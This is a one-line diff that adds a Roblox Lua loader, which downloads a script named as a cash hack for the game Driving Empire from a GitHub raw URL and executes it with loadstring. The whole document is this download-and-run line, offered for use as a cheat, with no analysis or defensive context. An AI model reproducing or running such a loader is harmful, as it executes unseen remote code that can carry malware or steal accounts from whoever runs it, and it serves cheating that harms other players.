@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xLuaR/Roblox-Scripts/main/Driving Empire Cash Hack.lua"))()
